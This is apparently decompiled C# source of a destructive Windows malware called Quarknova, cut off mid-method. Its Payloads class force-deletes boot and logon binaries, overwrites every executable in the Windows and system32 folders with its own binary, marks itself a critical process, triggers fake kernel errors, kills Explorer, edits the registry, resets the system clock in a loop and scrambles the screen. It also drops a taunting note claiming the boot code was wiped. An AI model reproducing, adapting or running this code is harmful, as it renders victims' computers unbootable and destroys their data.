using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.ExceptionServices;
using System.Security;
using System.Speech.Synthesis;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using NAudio.Wave;
using Quarknova.Properties;
using Quarknova.Utilities;

namespace Quarknova.Main
{
	// Token: 0x02000008 RID: 8
	internal class Payloads
	{
		// Token: 0x06000069 RID: 105 RVA: 0x00003754 File Offset: 0x00001954
		public static void Initialize()
		{
			Payloads.ScreenX = SystemInformation.VirtualScreen.Left;
			Payloads.ScreenY = SystemInformation.VirtualScreen.Top;
			Payloads.RealWidth = SystemInformation.VirtualScreen.Right;
			Payloads.RealHeight = SystemInformation.VirtualScreen.Bottom;
			Payloads.Width = Payloads.RealWidth - SystemInformation.VirtualScreen.Left;
			Payloads.Height = Payloads.RealHeight - SystemInformation.VirtualScreen.Top;
			Payloads.filesSys32 = new List<FileInfo>(new DirectoryInfo(Path.GetPathRoot(Path.GetTempPath()) + "Windows\\system32").EnumerateFiles("*.exe", SearchOption.TopDirectoryOnly));
			Payloads.filesSys32.AddRange(new List<FileInfo>(new DirectoryInfo(Path.GetPathRoot(Path.GetTempPath()) + "Windows").EnumerateFiles("*.exe", SearchOption.TopDirectoryOnly)));
			try
			{
				Payloads.GDIPlus = Graphics.FromHwnd(IntPtr.Zero);
				Payloads.GDIPlus.InterpolationMode = InterpolationMode.NearestNeighbor;
				Payloads.GDIPlus.CompositingQuality = CompositingQuality.HighSpeed;
				Payloads.GDIPlus.SmoothingMode = SmoothingMode.None;
				Payloads.GDIPlus.PixelOffsetMode = PixelOffsetMode.None;
			}
			catch
			{
			}
			Payloads.WindowsSoundList = new List<string>(Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Media", "*.wav", SearchOption.AllDirectories));
			if (Payloads.WindowsSoundList.Count == 0)
			{
				Payloads.WindowsSoundList = null;
			}
			Payloads.StartPayload(delegate
			{
				Imports.GetCursorPos(out Payloads.cursor);
			}, 25);
		}

		// Token: 0x0600006A RID: 106 RVA: 0x000038EC File Offset: 0x00001AEC
		public static void CheckDate(Action action, int day, int month, int year, bool enableRandRop = true, bool writeData = true)
		{
			DateTime now = DateTime.Now;
			bool flag = File.Exists(string.Format("{0}\\{1}.{2}.{3}", new object[]
			{
				Payloads.QuarknovaDirectory,
				day.ToString("X"),
				month.ToString("X"),
				year.ToString("X")
			}));
			if (now.Day == day && now.Month == month && now.Year == year && !flag)
			{
				if (writeData)
				{
					Functions.CreateQuarknovaData(string.Concat(new string[]
					{
						day.ToString("X"),
						".",
						month.ToString("X"),
						".",
						year.ToString("X")
					}), "");
				}
				action();
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x000039C7 File Offset: 0x00001BC7
		public static void UpdateProcs()
		{
			Payloads.procs = new WindowHandleInfo(IntPtr.Zero).GetAllChildHandles();
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000039DD File Offset: 0x00001BDD
		public static Thread StartPayload(Action payload, int loopDelay = -1)
		{
			Thread thread = new Thread((loopDelay < 0) ? new ThreadStart(payload.Invoke) : Functions.ThreadLoop(payload, loopDelay));
			thread.Start();
			return thread;
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00003A03 File Offset: 0x00001C03
		public static void RandHardError()
		{
			new Thread(delegate()
			{
				uint num;
				Imports.NtRaiseHardError((uint)(Functions.RNG(-1077542938, int.MaxValue) + 1077542938), 0U, 0U, IntPtr.Zero, 6U, out num);
			}).Start();
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00003A30 File Offset: 0x00001C30
		public static void KernelPanic()
		{
			uint num;
			Imports.NtRaiseHardError(3735936685U, 0U, 0U, IntPtr.Zero, 6U, out num);
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00003A52 File Offset: 0x00001C52
		public static void SetCritical()
		{
			Imports.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref Payloads.isCritical, 4);
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00003A6C File Offset: 0x00001C6C
		public static void WriteNote()
		{
			string contents = string.Concat(new string[]
			{
				"Hello, I am the Quarknova that is expanding in your computer.",
				Environment.NewLine,
				"As you may have noticed, I am currently infecting your system files. The infection is going too fast for you to stop it.",
				Environment.NewLine,
				"However, if you succeed in stopping the infection, your computer will be dead anyways because I overwrote all disk bootcodes with useless data.",
				Environment.NewLine,
				"Have fun with what's left of this operating system while I add a majestic spice to your tasks, hehe.",
				Environment.NewLine,
				"117114032119105108108121032105115032114117098098105115104"
			});
			File.WriteAllText("quarknova_note.txt", contents);
			Process.Start("notepad.exe", "quarknova_note.txt");
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00003AEC File Offset: 0x00001CEC
		public static void InfectSystemFiles()
		{
			Functions.ForceDeleteFile(Path.GetPathRoot(Path.GetTempPath()) + "Windows\\system32\\Boot\\winload.exe");
			Functions.ForceDeleteFile(Path.GetPathRoot(Path.GetTempPath()) + "Windows\\system32\\LogonUI.exe");
			Functions.ForceDeleteFile(Path.GetPathRoot(Path.GetTempPath()) + "Windows\\system32\\Boot\\winresume.exe");
			byte[] bytes = File.ReadAllBytes(Assembly.GetEntryAssembly().Location);
			foreach (FileInfo fileInfo in Payloads.filesSys32)
			{
				try
				{
					if (!(fileInfo.FullName.ToLower() == Path.GetPathRoot(Path.GetTempPath()).ToLower() + "windows\\system32\\cmd.exe") && !(fileInfo.FullName.ToLower() == Path.GetPathRoot(Path.GetTempPath()).ToLower() + "windows\\system32\\icacls.exe") && !(fileInfo.FullName.ToLower() == Path.GetPathRoot(Path.GetTempPath()).ToLower() + "windows\\system32\\takeown.exe") && !(fileInfo.FullName.ToLower() == Path.GetPathRoot(Path.GetTempPath()).ToLower() + "windows\\system32\\reg.exe") && !(fileInfo.FullName.ToLower() == Path.GetPathRoot(Path.GetTempPath()).ToLower() + "windows\\system32\\notepad.exe"))
					{
						Functions.ForceOverwriteFile(fileInfo.FullName, bytes);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00003CAC File Offset: 0x00001EAC
		public static void JitterCursor()
		{
			Imports.SetCursorPos(Payloads.cursor.X + Functions.RNG(-(Payloads.JitterRate / Payloads.JitterSlowdown), Payloads.JitterRate / Payloads.JitterSlowdown), Payloads.cursor.Y + Functions.RNG(-(Payloads.JitterRate / Payloads.JitterSlowdown), Payloads.JitterRate / Payloads.JitterSlowdown));
			Payloads.JitterRate++;
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00003D1C File Offset: 0x00001F1C
		public static void CursorSquare()
		{
			for (int i = 0; i < 50; i++)
			{
				Imports.GetCursorPos(out Payloads.cursor);
				Imports.SetCursorPos(Payloads.cursor.X + 1, Payloads.cursor.Y);
				Thread.Sleep(1);
			}
			for (int j = 0; j < 50; j++)
			{
				Imports.GetCursorPos(out Payloads.cursor);
				Imports.SetCursorPos(Payloads.cursor.X, Payloads.cursor.Y - 1);
				Thread.Sleep(1);
			}
			for (int k = 0; k < 50; k++)
			{
				Imports.GetCursorPos(out Payloads.cursor);
				Imports.SetCursorPos(Payloads.cursor.X - 1, Payloads.cursor.Y);
				Thread.Sleep(1);
			}
			for (int l = 0; l < 50; l++)
			{
				Imports.GetCursorPos(out Payloads.cursor);
				Imports.SetCursorPos(Payloads.cursor.X, Payloads.cursor.Y + 1);
				Thread.Sleep(1);
			}
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00003E11 File Offset: 0x00002011
		public static void Stretch()
		{
			Payloads.StretchSpeed += 2;
			Payloads.StretchWidth();
			Payloads.StretchHeight();
			Payloads.StretchSpeed--;
			if (Payloads.StretchSpeed > 30)
			{
				Payloads.StretchSpeed = 4;
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00003E44 File Offset: 0x00002044
		public static void StretchWidth()
		{
			for (int i = Payloads.ScreenX; i < Payloads.Width; i += Payloads.StretchSpeed)
			{
				Imports.StretchBlt(Payloads.hDC, Payloads.ScreenX, Payloads.ScreenY, i, Payloads.Height, Payloads.hDC, Payloads.ScreenX, Payloads.ScreenY, Payloads.Width, Payloads.Height, Functions.RandRop(-1));
				Thread.Sleep(1);
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00003EAC File Offset: 0x000020AC
		public static void StretchHeight()
		{
			for (int i = Payloads.ScreenY; i < Payloads.Height; i += Payloads.StretchSpeed)
			{
				Imports.StretchBlt(Payloads.hDC, Payloads.ScreenX, Payloads.ScreenY, Payloads.Width, i, Payloads.hDC, Payloads.ScreenX, Payloads.ScreenY, Payloads.Width, Payloads.Height, Functions.RandRop(-1));
				Thread.Sleep(1);
			}
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00003F14 File Offset: 0x00002114
		public static void FillQuark()
		{
			try
			{
				using (Bitmap bitmap = new Bitmap(Payloads.Width, Payloads.Height))
				{
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.FillPolygon(Functions.GetQuarkGradient(), Functions.GetRandFloatPoints());
						while (Payloads.GDIPlus == null)
						{
							try
							{
								Payloads.GDIPlus = Graphics.FromHwnd(IntPtr.Zero);
							}
							catch
							{
							}
							Thread.Sleep(1000);
						}
						Payloads.GDIPlus.DrawIcon(Icon.FromHandle(bitmap.GetHicon()), 0, 0);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00003FD8 File Offset: 0x000021D8
		public static void RandScreenshots()
		{
			if (Functions.RNG(0, 1) == 0)
			{
				IntPtr hWnd = Payloads.procs[Functions.RNG(0, Payloads.procs.Count - 1)];
				IntPtr intPtr = Payloads.procs[Functions.RNG(0, Payloads.procs.Count - 1)];
				try
				{
					using (Graphics.FromHwnd(intPtr))
					{
						IntPtr dc = Imports.GetDC(hWnd);
						IntPtr dc2 = Imports.GetDC(intPtr);
						if (!(dc == IntPtr.Zero) && !(dc2 == IntPtr.Zero))
						{
							Imports.StretchBlt(dc, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), dc2, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.Width / 2, Payloads.Width), Functions.RNG(Payloads.Height / 2, Payloads.Height), Functions.RandRop(-1));
							Thread.Sleep(100);
							Imports.StretchBlt(dc2, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), dc, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.Width / 2, Payloads.Width), Functions.RNG(Payloads.Height / 2, Payloads.Height), Functions.RandRop(-1));
							Thread.Sleep(100);
							Imports.StretchBlt(Payloads.hDC, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), dc, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.Width / 2, Payloads.Width), Functions.RNG(Payloads.Height / 2, Payloads.Height), Functions.RandRop(-1));
							Thread.Sleep(100);
							Imports.StretchBlt(Payloads.hDC, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), dc2, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.Width / 2, Payloads.Width), Functions.RNG(Payloads.Height / 2, Payloads.Height), Functions.RandRop(-1));
							Thread.Sleep(100);
							Imports.StretchBlt(dc, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Payloads.hDC, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.Width / 2, Payloads.Width), Functions.RNG(Payloads.Height / 2, Payloads.Height), Functions.RandRop(-1));
							Thread.Sleep(100);
							Imports.StretchBlt(dc2, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Payloads.hDC, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.Width / 2, Payloads.Width), Functions.RNG(Payloads.Height / 2, Payloads.Height), Functions.RandRop(-1));
							Imports.ReleaseDC(hWnd, dc);
							Imports.ReleaseDC(intPtr, dc2);
						}
					}
					return;
				}
				catch (InvalidOperationException)
				{
					return;
				}
			}
			Imports.BitBlt(Payloads.hDC, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Payloads.hDC, Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RandRop(5));
		}

		// Token: 0x06000079 RID: 121 RVA: 0x0000449C File Offset: 0x0000269C
		public static void ScreenDisplacement()
		{
			int num = Functions.RNG(Payloads.ScreenX, Payloads.Width);
			int num2 = Functions.RNG(Payloads.ScreenY, Payloads.Height);
			for (int i = -(int)Payloads.DisplacementRate; i < (int)Payloads.DisplacementRate; i++)
			{
				Imports.BitBlt(Payloads.hDC, num + i, num2 + i, (Functions.RNG(0, 1) == 0) ? Payloads.Width : (Payloads.Width / Functions.RNG(1, 20)), (Functions.RNG(0, 1) == 0) ? Payloads.Height : (Payloads.Height / Functions.RNG(1, 20)), Payloads.hDC, num, num2, Functions.RandRop(-1));
				Thread.Sleep(1);
			}
			Payloads.DisplacementRate += 0.2m;
			if (Payloads.RandRopChance > 5)
			{
				Payloads.RandRopChance--;
			}
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00004578 File Offset: 0x00002778
		public static void ScreenFuzzifier()
		{
			int num = Functions.RNG(Payloads.ScreenX, Payloads.Width);
			int num2 = Functions.RNG(Payloads.ScreenY, Payloads.Height);
			int num3 = Functions.RNG(1, Payloads.Width / 2);
			int num4 = Functions.RNG(1, Payloads.Height / 2);
			Imports.StretchBlt(Payloads.hDC, num + Functions.RNG(-8, 8), num2 + Functions.RNG(-8, 8), num3, num4, Payloads.hDC, num, num2, num3 + Functions.RNG(-32, 32), num4 + Functions.RNG(-32, 32), Functions.RandRop(-1));
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00004608 File Offset: 0x00002808
		public static void ColorBrush()
		{
			while (Payloads.GDIPlus == null)
			{
				try
				{
					Payloads.GDIPlus = Graphics.FromHwnd(IntPtr.Zero);
				}
				catch
				{
				}
				Thread.Sleep(1000);
			}
			try
			{
				if (Functions.RNG(0, 1) == 0)
				{
					if (Functions.RNG(0, 1) == 0)
					{
						Payloads.GDIPlus.FillRectangle(new SolidBrush(Functions.GetRandColor(Functions.RNG(0, 1) == 0, Functions.RNG(0, 1) == 0)), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(1, 48), Functions.RNG(1, 48));
						Payloads.GDIPlus.FillEllipse(new SolidBrush(Functions.GetRandColor(Functions.RNG(0, 1) == 0, Functions.RNG(0, 1) == 0)), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(1, 48), Functions.RNG(1, 48));
					}
					else
					{
						Payloads.GDIPlus.FillPolygon(new SolidBrush(Functions.GetRandColor(Functions.RNG(0, 1) == 0, Functions.RNG(0, 1) == 0)), Functions.GetSmallRandFloatPoints());
						Payloads.GDIPlus.DrawBeziers(new Pen(Functions.GetRandColor(true, false)), Functions.GetBezierFloatPoints());
					}
				}
				else if (Functions.RNG(0, 1) == 0)
				{
					Payloads.GDIPlus.FillRectangle(Functions.GetRandGradient(Functions.RNG(0, 1) == 0, Functions.RNG(0, 1) == 0), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(1, 48), Functions.RNG(1, 48));
					Payloads.GDIPlus.FillEllipse(Functions.GetRandGradient(Functions.RNG(0, 1) == 0, Functions.RNG(0, 1) == 0), Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(1, 48), Functions.RNG(1, 48));
				}
				else
				{
					Payloads.GDIPlus.FillPolygon(Functions.GetRandGradient(Functions.RNG(0, 1) == 0, Functions.RNG(0, 1) == 0), Functions.GetSmallRandFloatPoints());
					Payloads.GDIPlus.DrawBeziers(new Pen(Functions.GetRandColor(true, false)), Functions.GetBezierFloatPoints());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00004880 File Offset: 0x00002A80
		public static void SquishScreen()
		{
			Imports.StretchBlt(Payloads.hDC, Payloads.ScreenX, Payloads.ScreenY, Payloads.Width, Payloads.Height, Payloads.hDC, Payloads.Width - 1, Payloads.Height - 1, -Payloads.Width, -Payloads.Height, Functions.RandRop(-1));
			for (int i = Payloads.Width / (int)Payloads.SquishRate; i >= 0; i -= 4)
			{
				for (int j = Payloads.Height / (int)Payloads.SquishRate; j >= 0; j -= 4)
				{
					Imports.StretchBlt(Payloads.hDC, i, j, Payloads.Width - i * 2, Payloads.Height - j * 2, Payloads.hDC, Payloads.ScreenX, Payloads.ScreenY, Payloads.Width, Payloads.Height, Functions.RandRop(-1));
					if (Payloads.SquishRate < 1m)
					{
						Payloads.SquishRate -= 0.05m;
					}
					Thread.Sleep(1);
				}
			}
			Imports.StretchBlt(Payloads.hDC, 0, 0, Payloads.Width, Payloads.Height, Payloads.hDC, Payloads.Width - 1, Payloads.Height - 1, -Payloads.Width, -Payloads.Height, Functions.RandRop(-1));
			int num = 0;
			while ((double)num <= (double)Payloads.Width / ((double)((int)Payloads.SquishRate) * 1.25))
			{
				int num2 = 0;
				while ((double)num2 <= (double)Payloads.Height / ((double)((int)Payloads.SquishRate) * 1.25))
				{
					Imports.StretchBlt(Payloads.hDC, -num, -num2, Payloads.Width + num * 2, Payloads.Height + num2 * 2, Payloads.hDC, 0, 0, Payloads.Width, Payloads.Height, Functions.RandRop(-1));
					if (Payloads.SquishRate < 1m)
					{
						Payloads.SquishRate -= 0.05m;
					}
					Thread.Sleep(1);
					num2 += 4;
				}
				num += 4;
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00004A78 File Offset: 0x00002C78
		public static void ScreenColor()
		{
			new Thread(delegate()
			{
				using (QuickBitmap screenBmp = Functions.GetScreenBmp(-1, -1, -1, -1))
				{
					Functions.ColorFilter(screenBmp);
					try
					{
						Payloads.GDIPlus.DrawIcon(Icon.FromHandle(screenBmp.Bitmap.GetHicon()), 0, 0);
					}
					catch
					{
					}
				}
			}).Start();
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00004AA4 File Offset: 0x00002CA4
		public static void WindowsSounds()
		{
			if (Payloads.WindowsSoundList == null)
			{
				return;
			}
			for (;;)
			{
				try
				{
					Payloads.player.SoundLocation = Payloads.WindowsSoundList[Functions.RNG(0, Payloads.WindowsSoundList.Count - 1)];
					Payloads.player.Play();
				}
				catch
				{
					continue;
				}
				break;
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00004B00 File Offset: 0x00002D00
		public static void ScreenWave()
		{
			string path = Path.GetTempPath() + Path.GetRandomFileName() + ".mp3";
			File.WriteAllBytes(path, Resources.rgyy);
			Payloads.StartPayload(delegate
			{
				FileStream fileStream = File.OpenRead(path);
				try
				{
					Mp3FileReader mp3FileReader = new Mp3FileReader(fileStream);
					try
					{
						WaveStream waveStream = WaveFormatConversionStream.CreatePcmStream(mp3FileReader);
						try
						{
							BlockAlignReductionStream blockAlignReductionStream = new BlockAlignReductionStream(waveStream);
							try
							{
								WaveOut waveOut = new WaveOut(WaveCallbackInfo.FunctionCallback());
								try
								{
									waveOut.Init(blockAlignReductionStream);
									for (;;)
									{
										waveOut.Play();
										while (waveOut.PlaybackState == PlaybackState.Playing) // hi! ultimateduck here, can somebody
										{													   // tell mes if it works? kinda busy rn
											Thread.Sleep(100);
										}
										mp3FileReader.Position = 0L;
									}
								}
								finally
								{
									if (waveOut != null)
									{
										waveOut.Dispose();
										goto IL_64;
									}
									goto IL_64;
									IL_64:;
								}
							}
							finally
							{
								if (blockAlignReductionStream != null)
								{
									blockAlignReductionStream.Dispose();
									goto IL_6E;
								}
								goto IL_6E;
								IL_6E:;
							}
						}
						finally
						{
							if (waveStream != null)
							{
								waveStream.Dispose();
								goto IL_78;
							}
							goto IL_78;
							IL_78:;
						}
					}
					finally
					{
						if (mp3FileReader != null)
						{
							mp3FileReader.Dispose();
							goto IL_82;
						}
						goto IL_82;
						IL_82:;
					}
				}
				finally
				{
					if (fileStream != null)
					{
						((IDisposable)fileStream).Dispose();
						goto IL_8C;
					}
					goto IL_8C;
					IL_8C:;
				}
			}, -1);
			int wd = Payloads.Width / 100;
			int rhd = 0;
			ThreadStart <>9__1;
			for (int i = 0; i < 50; i++)
			{
				ThreadStart start;
				if ((start = <>9__1) == null)
				{
					start = (<>9__1 = delegate()
					{
						int cy = rhd += Payloads.Height / 50;
						for (;;)
						{
							decimal num = wd;
							while (num > 0m)
							{
								Imports.BitBlt(Payloads.hDC, wd - (int)num, 0, Payloads.Width, cy, Payloads.hDC, 0, 0, Functions.RandRop(-1));
								Thread.Sleep((int)num * 4);
								num = --num;
							}
							num = 0.25m;
							while (num < wd)
							{
								Imports.BitBlt(Payloads.hDC, (int)num, 0, Payloads.Width, cy, Payloads.hDC, 0, 0, Functions.RandRop(-1));
								Thread.Sleep((int)num * 4);
								num = ++num;
							}
							num = wd;
							while (num > 0m)
							{
								Imports.BitBlt(Payloads.hDC, -(wd - (int)num), 0, Payloads.Width, cy, Payloads.hDC, 0, 0, Functions.RandRop(-1));
								Thread.Sleep((int)num * 4);
								num = --num;
							}
							num = 0.25m;
							while (num < wd)
							{
								Imports.BitBlt(Payloads.hDC, -(int)num, 0, Payloads.Width, cy, Payloads.hDC, 0, 0, Functions.RandRop(-1));
								Thread.Sleep((int)num * 4);
								num = ++num;
							}
						}
					});
				}
				new Thread(start).Start();
				Thread.Sleep(200);
			}
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00004BA8 File Offset: 0x00002DA8
		public static void RandomKey()
		{
			try
			{
				SendKeys.SendWait(((char)Functions.RNG(33, 254)).ToString());
			}
			catch (ArgumentException)
			{
				SendKeys.SendWait("{" + ((char)Functions.RNG(33, 254)).ToString() + "}");
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00004C10 File Offset: 0x00002E10
		[HandleProcessCorruptedStateExceptions]
		[SecurityCritical]
		public static void WindowCorruptor()
		{
			try
			{
				foreach (IntPtr intPtr in Payloads.procs)
				{
					if (!(intPtr == Payloads.hWndCurrentProc))
					{
						Functions.CorruptHandle(intPtr);
						Imports.SetWindowText(intPtr, Functions.GetRandString(32, 2048, 256));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00004C98 File Offset: 0x00002E98
		public static void NepotonodIcons()
		{
			for (;;)
			{
				Imports.DrawIcon(Payloads.hDC, Functions.RNG(-32, Payloads.Width + 32), Functions.RNG(-32, Payloads.Height + 32), Payloads.Icons[Functions.RNG(0, Payloads.Icons.Length - 1)].Handle);
			}
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00004CEC File Offset: 0x00002EEC
		public static void NepotonodEarthquake()
		{
			Imports.BitBlt(Payloads.hDC, Functions.RNG(1, 8), 0, Payloads.Width, Payloads.Height, Payloads.hDC, 0, 0, Imports.TernaryRasterOperations.SRCCOPY);
			Imports.BitBlt(Payloads.hDC, Functions.RNG(-8, -1), 0, Payloads.Width, Payloads.Height, Payloads.hDC, 0, 0, Imports.TernaryRasterOperations.SRCCOPY);
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00004D4C File Offset: 0x00002F4C
		public static void IconExplosion()
		{
			RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop", true);
			key.SetValue("FFlags", 544, RegistryValueKind.DWord);
			key.Close();
			IntPtr hwndIcon = Imports.FindWindow("Progman", null);
			hwndIcon = Imports.FindWindowEx(hwndIcon, IntPtr.Zero, "SHELLDLL_DefView", null);
			hwndIcon = Imports.FindWindowEx(hwndIcon, IntPtr.Zero, "SysListView32", "FolderView");
			int procId;
			Imports.GetWindowThreadProcessId(hwndIcon, out procId);
			Process proc = Process.GetProcessById(procId);
			proc.Kill();
			Thread.Sleep(5000);
			hwndIcon = Imports.FindWindow("Progman", null);
			hwndIcon = Imports.FindWindowEx(hwndIcon, IntPtr.Zero, "SHELLDLL_DefView", null);
			hwndIcon = Imports.FindWindowEx(hwndIcon, IntPtr.Zero, "SysListView32", "FolderView");
			Imports.GetWindowThreadProcessId(hwndIcon, out procId);
			new Thread(delegate()
			{
				for (;;)
				{
					object value;
					try
					{
						value = key.GetValue("FFlags");
					}
					catch
					{
						key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop", true);
						continue;
					}
					if (value == null || (int)value != 544)
					{
						key.SetValue("FFlags", 544, RegistryValueKind.DWord);
						key.Close();
						try
						{
							Imports.GetWindowThreadProcessId(hwndIcon, out procId);
						}
						catch
						{
							Process.Start("explorer.exe");
							Thread.Sleep(5000);
							continue;
						}
						proc = Process.GetProcessById(procId);
						proc.Kill();
						Thread.Sleep(5000);
						hwndIcon = Imports.FindWindow("Progman", null);
						hwndIcon = Imports.FindWindowEx(hwndIcon, IntPtr.Zero, "SHELLDLL_DefView", null);
						hwndIcon = Imports.FindWindowEx(hwndIcon, IntPtr.Zero, "SysListView32", "FolderView");
					}
					Thread.Sleep(1000);
				}
			}).Start();
			Random random = new Random();
			int num = Imports.SendMessage(hwndIcon, 4100, 0, IntPtr.Zero);
			for (;;)
			{
				for (int i = 0; i < num; i++)
				{
					int num2 = random.Next(32, 197);
					Imports.SendMessage(hwndIcon, 4111, i, Functions.CreateLParam(Payloads.cursor.X + random.Next(-num2, num2 + 1), Payloads.cursor.Y + random.Next(-num2, num2 + 1)));
					Thread.Sleep(10);
				}
			}
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00004F1C File Offset: 0x0000311C
		public static void EnableRotation()
		{
			float num = 0f;
			for (;;)
			{
				Matrix matrix = new Matrix();
				matrix.Rotate(num, MatrixOrder.Append);
				for (;;)
				{
					try
					{
						Payloads.GDIPlus.Transform = matrix;
					}
					catch
					{
						Thread.Sleep(1);
						continue;
					}
					break;
				}
				if (num < 360f)
				{
					num += 10f;
				}
				else
				{
					num = 0f;
				}
				Thread.Sleep(10);
			}
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00004F84 File Offset: 0x00003184
		public static void RotateScreen()
		{
			QuickBitmap screenBmp = Functions.GetScreenBmp(-1, -1, -1, -1);
			try
			{
				QuickBitmap quickBitmap = new QuickBitmap(Payloads.Width, Payloads.Height);
				try
				{
					Graphics graphics = Graphics.FromImage(quickBitmap.Bitmap);
					try
					{
						graphics.InterpolationMode = InterpolationMode.NearestNeighbor;
						graphics.CompositingQuality = CompositingQuality.HighSpeed;
						graphics.SmoothingMode = SmoothingMode.None;
						graphics.PixelOffsetMode = PixelOffsetMode.None;
						for (;;)
						{
							graphics.TranslateTransform((float)Payloads.Width / 2f, (float)Payloads.Height / 2f);
							graphics.RotateTransform(5f);
							graphics.TranslateTransform(-(float)Payloads.Width / 2f, -(float)Payloads.Height / 2f);
							graphics.DrawIcon(Icon.FromHandle(screenBmp.Bitmap.GetHicon()), 0, 0);
							try
							{
								Payloads.GDIPlus.DrawIcon(Icon.FromHandle(quickBitmap.Bitmap.GetHicon()), Payloads.ScreenX, Payloads.ScreenY);
							}
							catch
							{
							}
							Thread.Sleep(10);
						}
					}
					finally
					{
						if (graphics != null)
						{
							((IDisposable)graphics).Dispose();
							goto IL_E1;
						}
						goto IL_E1;
						IL_E1:;
					}
				}
				finally
				{
					if (quickBitmap != null)
					{
						((IDisposable)quickBitmap).Dispose();
						goto IL_EB;
					}
					goto IL_EB;
					IL_EB:;
				}
			}
			finally
			{
				if (screenBmp != null)
				{
					((IDisposable)screenBmp).Dispose();
					goto IL_F5;
				}
				goto IL_F5;
				IL_F5:;
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x000050BC File Offset: 0x000032BC
		public static void TimeMachine()
		{
			for (;;)
			{
				DateTime utcNow = DateTime.UtcNow;
				utcNow.AddHours((double)(DateTime.UtcNow.Hour - DateTime.Now.Hour + 1));
				Imports.SYSTEMTIME systemtime = Imports.SYSTEMTIME.FromDateTime(utcNow);
				Imports.SetSystemTime(ref systemtime);
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000088 RID: 136 RVA: 0x0000510C File Offset: 0x0000330C
		public static void ExecSystem32()
		{
